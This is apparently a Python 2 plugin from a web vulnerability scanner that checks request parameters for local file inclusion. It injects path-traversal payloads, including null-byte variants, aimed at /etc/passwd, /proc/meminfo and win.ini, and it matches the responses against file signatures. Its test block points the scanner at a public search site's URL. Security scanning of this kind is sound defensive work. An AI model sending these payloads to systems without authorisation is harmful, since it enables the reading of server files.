# coding=utf-8
'''
lfi.py
'''
import sys

sys.path.append("/Users/imiyoo/workplace/tscanner/")

import re
import teye_data.severity as severity
from teye_data.vuln import vuln
from teye_data.vulnmanager import vm

from LogManager import log

import copy
from http.Request import Request

# wCurl
from wCurl import wcurl
from util.smart_fill import smart_fill


class lfi:
    '''
	'''

    def __init__(self):
        '''
		'''
        self._fuzz_mode = "param"

    def check(self, t_request):
        '''
		'''
        log.info(u"正在检测目标是否存在文件包含漏洞...")

        http_request = copy.deepcopy(t_request)
        if http_request.get_method() == "GET":
            param_dict = http_request.get_get_param()

        if http_request.get_method() == "POST":
            param_dict = http_request.get_post_param()

        lfi_payload_list = self._get_payload_list(param_dict)

        vuln_name = set()

        for name, poc_info, pattern in lfi_payload_list:
            res = wcurl.get(http_request.get_url().get_uri_string(), params=poc_info)
            if self._find_vuln(res, pattern):
                if name in vuln_name:
                    continue
                vuln_name.add(name)

                v = vuln()
                url = res.get_url()
                v.set_url(url.get_uri_string() + "?" + str(poc_info))
                v.set_method("GET")
                v.set_param(name)
                v.set_name("LFI Vuln")
                v.set_rank(severity.H)
                vm.append(self, url.get_host(), "lfi", v)

                log.info("LFI Vuln")
                print u"LFI Vuln 漏洞URL:%s,漏洞参数:%s" % (url, name)

    def _find_vuln(self, res, pattern):
        '''
		'''
        if res is None:
            return False

        res_body = res.body

        if res_body is None:
            return False

        result = re.search(pattern, res_body, re.I)
        if result:
            return True

        return False

    def _fill_param(self, param):
        '''
		@param:{"a":[1]}
		'''
        param_dict = copy.deepcopy(param)

        for key, value in param_dict.iteritems():
            str_value = "".join(value)
            if str_value == "":
                param_dict[key] = smart_fill(key)

        return param_dict

    def _get_lfi_list(self):
        '''
		'''
        localfiles = []

        # Linux,Uninx
        # %00会被编码，这里用\x00来避免编码

        # /proc/meminfo文件
        localfiles.append(("/proc/meminfo", "memtotal:\s*\d+\s*\w{2}"))
        localfiles.append(("../../../../../../../../../../../../proc/meminfo", "memtotal:\s*\d+\s*\w{2}"))
        localfiles.append(("../../../../../../../../../../../../proc/meminfo\x00", "memtotal:\s*\d+\s*\w{2}"))
        localfiles.append(("../../../../../../../../../../../../proc/meminfo\x00.html", "memtotal:\s*\d+\s*\w{2}"))
        # /etc/passwd文件
        localfiles.append(("/etc/passwd", "root:x:0:0:"))
        localfiles.append(("../../../../../../../../../../../etc/passwd", "root:x:0:0:"))
        localfiles.append(("../../../../../../../../../../../etc/passwd\x00", "root:x:0:0:"))
        localfiles.append(("../../../../../../../../../../../etc/passwd\x00.html", "root:x:0:0:"))

        # wavsep
        localfiles.append(("/default.txt", "12345"))

        localfiles.append(("c:/windows/win.ini", "\[fonts\].*\[extensions\]"))

        return localfiles

    def _get_payload_list(self, param):
        '''
		'''
        res = []

        temp_param_dict = self._fill_param(param)

        temp_param_key = temp_param_dict.keys()

        for name in temp_param_key:
            o_v = temp_param_dict.get(name)
            if type(o_v) is list:
                if len(o_v) <= 1:
                    o_v = "".join(o_v)
            else:
                o_v = o_v

            payload_list = self._get_lfi_list()

            for payload, pattern in payload_list:
                # 完整的参数信息，字典类型
                poc_param_dict = copy.deepcopy(temp_param_dict)
                poc_param_dict[name] = payload
                poc_tuple = (name, poc_param_dict, pattern)
                res.append(poc_tuple)
        return res

    def get_name(self):
        '''
		'''
        return "teye_lfi_plugin"


if __name__ == "__main__":
    '''
	'''
    # sql_url = "http://nmg01-inf-ssl3.nmg01.baidu.com:8084/poc/sql-in/get_str.php?user="
    # sql_url="http://nmg01-inf-ssl3.nmg01.baidu.com:8084/poc/sql-in/get_int.php?id=1"
    # xss_url="http://nmg01-inf-ssl3.nmg01.baidu.com:8084/poc/xss/xss_sample.php?q="
    # dom_xss="http://nmg01-inf-ssl3.nmg01.baidu.com:8084/poc/xss/dom_xss_sample.php?name="
    # lfi_url="http://nmg01-inf-ssl3.nmg01.baidu.com:8084/poc/fileinclude/finclude_get.php?file=test.php"
    # lfi_url="http://nmg01-inf-ssl3.nmg01.baidu.com:8084/file_include/file_include_00.php?file="
    un_url = "http://www.haosou.com:80/s?q=&src=360sou_newhome&shb=1&ie=utf-8"
    req = Request(un_url)
    vuln_inst = lfi()
    vuln_inst.check(req)
    print vm.get_all_vuln()
